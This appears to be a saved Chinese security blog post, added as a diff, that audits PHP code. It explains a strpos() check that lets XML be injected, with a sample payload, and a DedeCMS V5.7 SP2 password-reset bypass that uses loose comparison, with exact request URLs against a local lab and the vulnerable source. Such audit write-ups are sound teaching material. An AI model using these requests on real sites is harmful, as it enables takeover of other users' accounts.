@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="##Day 4 - False Beard ###题目名字:假胡子代码如下: ##代码大意:题目定义了一个登陆类,在7-10行对传入的参数$user与$pass进行了判断,但是这里的判断是有问题的,这也是本次产生漏洞的地方,11-12行进行了格式化字符串 使用xml结构存储登陆数据,并在16行调用了登陆类进行登陆操作 ##漏洞产生A.我们先来看下strpos()函数 PHP strpos() 函">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计Day4 - strpos使用不当引发漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/09/27/代码审计Day4 - strpos使用不当引发漏洞/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="##Day 4 - False Beard ###题目名字:假胡子代码如下: ##代码大意:题目定义了一个登陆类,在7-10行对传入的参数$user与$pass进行了判断,但是这里的判断是有问题的,这也是本次产生漏洞的地方,11-12行进行了格式化字符串 使用xml结构存储登陆数据,并在16行调用了登陆类进行登陆操作 ##漏洞产生A.我们先来看下strpos()函数 PHP strpos() 函">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/k6us42u3h1vo6gsj8fmn93ov/image_1coc8vpb31o8a1e2513vsfr71licm.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/hxi1hw3eyjqzrimfe55ya959/image_1coc8uslu1o8l1k3e9stsps1tld9.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/srccuqejrb04txpxjpk84u19/image_1coc9hf541mltd0vofedkq1ssa13.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/r75qe4s49rk9lqrhsnr1hvtq/image_1cocjrlme1ckv1fe3kqsbdtr1520.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/msxov9pukodl2uhhztovscla/image_1cock5fj91to8189mj9a1k35118e2t.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/oi0pbvojzfjopddkgllcrk8n/image_1cockdrl1efg122ma733rq3dc67.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/255tksowj8eeajh98p91k8kz/image_1cockk8c4hjc1lht5g310hq7b86k.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/915su480ub47uwuzinoj4g1b/image_1coclnmmb6tonv9ehb8ab1o1q7e.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/4cqrpdq1s825scwx95egp69y/image_1cocmr2gijdf16uf1q5upne1l5p7r.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/52avfkywkcw0e0lr2mtt4yuz/image_1cocqa07i19e01jl1gpl15sv1cme9.png">
+<meta property="og:updated_time" content="2018-09-27T06:34:34.353Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计Day4 - strpos使用不当引发漏洞">
+<meta name="twitter:description" content="##Day 4 - False Beard ###题目名字:假胡子代码如下: ##代码大意:题目定义了一个登陆类,在7-10行对传入的参数$user与$pass进行了判断,但是这里的判断是有问题的,这也是本次产生漏洞的地方,11-12行进行了格式化字符串 使用xml结构存储登陆数据,并在16行调用了登陆类进行登陆操作 ##漏洞产生A.我们先来看下strpos()函数 PHP strpos() 函">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/k6us42u3h1vo6gsj8fmn93ov/image_1coc8vpb31o8a1e2513vsfr71licm.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/27/代码审计Day4 - strpos使用不当引发漏洞/"/>
+
+
+
+
+
+  <title>代码审计Day4 - strpos使用不当引发漏洞 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/27/代码审计Day4 - strpos使用不当引发漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">代码审计Day4 - strpos使用不当引发漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-27T23:15:41+08:00">
+                2018-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<p>##<strong>Day 4 - False Beard</strong></p>
+<p>###题目名字:假胡子<br>代码如下:<br><img src="http://static.zybuluo.com/chhyx/k6us42u3h1vo6gsj8fmn93ov/image_1coc8vpb31o8a1e2513vsfr71licm.png" alt="image_1coc8vpb31o8a1e2513vsfr71licm.png-162.2kB"></p>
+<p>##<strong>代码大意:</strong><br>题目定义了一个登陆类,在7-10行对传入的参数<code>$user</code>与<code>$pass</code>进行了判断,但是这里的判断是有问题的,这也是本次产生漏洞的地方,11-12行进行了格式化字符串 使用xml结构存储登陆数据,并在16行调用了登陆类进行登陆操作</p>
+<p>##<strong>漏洞产生</strong><br>A.我们先来看下<code>strpos()</code>函数</p>
+<pre><code>PHP strpos() 函数
+作用:strpos() 函数查找字符串在另一字符串中第一次出现的位置。。
+定义:strpos(string,find,start)
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/hxi1hw3eyjqzrimfe55ya959/image_1coc8uslu1o8l1k3e9stsps1tld9.png" alt="image_1coc8uslu1o8l1k3e9stsps1tld9.png-24.3kB"><br>我们可看到上面的例子中 如果我们要找的字符在目标字符串的开头 则会返回0,若不存在返回false,那么在回到这道题目 开发者只考虑返回false的情况,却忽略了匹配的字符在开头的情况 0与false取反都为true,这样我们就可以在用户和密码首字符注入&lt;符号 从而注入xml数据。</p>
+<p>B.我们测试下我们的<code>payload</code>:</p>
+<pre><code>$user=&lt;&quot;&gt;&lt;injected-tag property=&quot;&amp;$pass=&apos;&lt;injected-tag&gt;&apos;
+</code></pre><p>测试例子：<br><img src="http://static.zybuluo.com/chhyx/srccuqejrb04txpxjpk84u19/image_1coc9hf541mltd0vofedkq1ssa13.png" alt="image_1coc9hf541mltd0vofedkq1ssa13.png-53.4kB"></p>
+<p>说明可以注入xml数据</p>
+<p>##<strong>实例cms分析:</strong><br>这里选择<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">DedeCMS-V5.7-UTF8-SP2</a>的一处任意用户密码重置漏洞,由于对接收的参数<code>$safequestion</code>没有进行严格的类型判断,导致可以使用弱类型比较绕过<br><strong>1.环境搭建:</strong><br>下载后将uploads目录放在网站根目录安装即可<br><strong>2.漏洞利用:</strong><br>A.首先登陆后台开启会员功能<br><img src="http://static.zybuluo.com/chhyx/r75qe4s49rk9lqrhsnr1hvtq/image_1cocjrlme1ckv1fe3kqsbdtr1520.png" alt="image_1cocjrlme1ckv1fe3kqsbdtr1520.png-89.3kB"></p>
+<p>B.注册2个会员且不设置安全密保问题(这是重置的关键)</p>
+<p>C.用户test1的id为8   test2的id为9<br><img src="http://static.zybuluo.com/chhyx/msxov9pukodl2uhhztovscla/image_1cock5fj91to8189mj9a1k35118e2t.png" alt="image_1cock5fj91to8189mj9a1k35118e2t.png-14.8kB"></p>
+<p>D.在登陆账号test1的情况下访问链接:</p>
+<pre><code>http://127.0.0.1:84/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=9
+</code></pre><p>抓包,放到Repeater重放,得到test2的key:<br><img src="http://static.zybuluo.com/chhyx/oi0pbvojzfjopddkgllcrk8n/image_1cockdrl1efg122ma733rq3dc67.png" alt="image_1cockdrl1efg122ma733rq3dc67.png-114kB"></p>
+<p>E.然后带着id与key访问:</p>
+<pre><code>http://127.0.0.1:84/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=3uZAQ9Z
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/255tksowj8eeajh98p91k8kz/image_1cockk8c4hjc1lht5g310hq7b86k.png" alt="image_1cockk8c4hjc1lht5g310hq7b86k.png-56.3kB"></p>
+<p>填写密码即可更改用户test2的密码</p>
+<p><strong>3.代码分析:</strong><br>相关<code>变量</code>已添加到注释中:<br>A.根据漏洞url定位到<code>member\resetpassword.php</code>的<code>safequestion</code>操作:</p>
+<pre><code>else if($dopost == &quot;safequestion&quot;)
+{
+    $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id);
+    $sql = &quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &apos;$mid&apos;&quot;;
+    $row = $db-&gt;GetOne($sql);
+    if(empty($safequestion)) $safequestion = &apos;&apos;;
+    if(empty($safeanswer)) $safeanswer = &apos;&apos;;
+    //$row[&apos;safequestion&apos;]:&quot;0&quot;  $row[&apos;safeanswer&apos;]:&apos;&apos;
+    if($row[&apos;safequestion&apos;] == $safequestion &amp;&amp; $row[&apos;safeanswer&apos;] == $safeanswer)
+    {
+        sn($mid, $row[&apos;userid&apos;], $row[&apos;email&apos;], &apos;N&apos;);
+        exit();
+    }
+    else
+    {
+        ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;,&quot;-1&quot;);
+        exit();
+    }
+
+}
+</code></pre><p>这里先根据传入的<code>id</code>参数查询对应用户的<code>密保问题答案</code> <code>userid</code> <code>邮箱</code>等信息,接着下面进行判断,如果传入的<code>$safequestion</code>与<code>$safeanswer</code>非空且与之前设置的相等,就进入<code>sn()</code>函数操作 它这里用的是 <code>==</code> 而非 <code>===</code> 来判断,所以这里是可以绕过的<br>我们看个小例子:<br><img src="http://static.zybuluo.com/chhyx/915su480ub47uwuzinoj4g1b/image_1coclnmmb6tonv9ehb8ab1o1q7e.png" alt="image_1coclnmmb6tonv9ehb8ab1o1q7e.png-27.7kB"></p>
+<p>B.那么这里我们就可以用<code>safequestion=0.0&amp;safeanswer=</code>即可使<code>$row[&#39;safequestion&#39;] == $safequestion &amp;&amp; $row[&#39;safeanswer&#39;] == $safeanswer)</code><br>为true,进入<code>sn()</code>函数:</p>
+<pre><code>#uploads\member\inc\inc_pwd_function.php 150行
+function sn($mid,$userid,$mailto, $send = &apos;Y&apos;)
+{
+    global $db;
+    $tptim= (60*10);
+    $dtime = time();
+    $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &apos;$mid&apos;&quot;;
+    $row = $db-&gt;GetOne($sql);
+    if(!is_array($row))
+    {
+        //发送新邮件；
+        newmail($mid,$userid,$mailto,&apos;INSERT&apos;,$send);
+    }
+    //10分钟后可以再次发送新验证码；
+    elseif($dtime - $tptim &gt; $row[&apos;mailtime&apos;])
+    {
+        newmail($mid,$userid,$mailto,&apos;UPDATE&apos;,$send);
+    }
+    //重新发送新的验证码确认邮件；
+    else
+    {
+        return ShowMsg(&apos;对不起，请10分钟后再重新申请&apos;, &apos;login.php&apos;);
+    }
+}
+</code></pre><p>这里代码逻辑是先根据<code>id</code>从<code>dede_pwd_tmp</code>数据表中判断是否有对应的密码记录,若账号为第一次修改密码,这里的<code>$row</code>就会空,进入<code>newmail()</code>函数,执行<code>insert()</code>操作:</p>
+<pre><code>#uploads\member\resetpassword.php 73行
+function newmail($mid, $userid, $mailto, $type, $send)
+{
+    ...
+    $randval = random(8);
+    ...
+    if($type == &apos;INSERT&apos;)
+    {
+        $key = md5($randval);
+        $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&apos;$mid&apos;, &apos;$userid&apos;,  &apos;$key&apos;, &apos;$mailtime&apos;);&quot;;
+        if($db-&gt;ExecuteNoneQuery($sql))
+        {
+            if($send == &apos;Y&apos;)
+            {
+                ...
+            } else if ($send == &apos;N&apos;)
+            {
+                return ShowMsg(&apos;稍后跳转到修改页&apos;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);
+            }
+        }
+        else
+        {
+            }
+    }
+</code></pre><p>先生成一个8位的随机密码并赋值给<code>$randval</code>,然后将其用md5加密,存储到<code>dede__pwd_tmp</code>表中,接着到了漏洞的触发点,进入<code>$send == &#39;N&#39;</code>的操作,将未经md5加密的<code>$randval</code>传给了用户</p>
+<p>那么这里拼接的url就为:</p>
+<pre><code>http://127.0.0.1:84/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=3uZAQ9Z
+</code></pre><p>继续跟进<code>dopost=getpasswd</code>的操作:<br><img src="http://static.zybuluo.com/chhyx/4cqrpdq1s825scwx95egp69y/image_1cocmr2gijdf16uf1q5upne1l5p7r.png" alt="image_1cocmr2gijdf16uf1q5upne1l5p7r.png-68.6kB"></p>
+<p>这里先判断<code>id</code>是否执行过重置密码的操作 如果没有则退出,接着进入了<code>empty($setp)</code>的操作:</p>
+<pre><code> if(empty($setp))
+{
+    $tptim= (60*60*24*3);
+    $dtime = time();
+    if($dtime - $tptim &gt; $row[&apos;mailtime&apos;])
+    {
+        $db-&gt;executenonequery(&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &apos;$id&apos;;&quot;);
+        ShowMsg(&quot;对不起，临时密码修改期限已过期&quot;,&quot;login.php&quot;);
+        exit();
+    }
+    require_once(dirname(__FILE__).&quot;/templets/resetpassword2.htm&quot;);
+}
+</code></pre><p>判断是否超过修改期限 最后包含了<code>resetpassword2.htm</code><br>我们跟进去看一下:</p>
+<pre><code>#uploads\member\templets\resetpassword2.htm
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/52avfkywkcw0e0lr2mtt4yuz/image_1cocqa07i19e01jl1gpl15sv1cme9.png" alt="image_1cocqa07i19e01jl1gpl15sv1cme9.png-41.6kB"></p>
+<p>页面设置了setp为2 我们回到刚才的php文件继续分析<br>进入<code>$setp == 2</code>的操作:</p>
+<pre><code>#uploads\member\resetpassword.php 123行
+elseif($setp == 2)
+{
+    if(isset($key)) $pwdtmp = $key;
+    $sn = md5(trim($pwdtmp));
+    if($row[&apos;pwd&apos;] == $sn)
+    {
+        if($pwd != &quot;&quot;)
+        {
+            if($pwd == $pwdok)
+            {
+                $pwdok = md5($pwdok);
+                $sql = &quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &apos;$id&apos;;&quot;;
+                $db-&gt;executenonequery($sql);
+                $sql = &quot;UPDATE `#@__member` SET `pwd` = &apos;$pwdok&apos; WHERE `mid` = &apos;$id&apos;;&quot;;
+                if($db-&gt;executenonequery($sql))
+                {
+                    showmsg(&apos;更改密码成功，请牢记新密码&apos;, &apos;login.php&apos;);
+                    exit;
+                }
+            ...
+}
+</code></pre><p>这里判断了<code>$sn</code>与<code>dede__pwd_tmp</code>的<code>pwd</code>值(<code>$key</code>)是否相等,因为<br><code>$sn=md5($randval)=$row[&#39;pwd&#39;]</code> 所以进入下面的更改密码操作。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/26/利用DNSLOG快速获取数据(盲注)/" rel="next" title="渗透技巧 |  利用DNSLOG快速获取数据(盲注)">
+                <i class="fa fa-chevron-left"></i> 渗透技巧 |  利用DNSLOG快速获取数据(盲注)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/28/TP框架数据操作/" rel="prev" title="基础知识 | TP框架数据操作">
+                基础知识 | TP框架数据操作 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
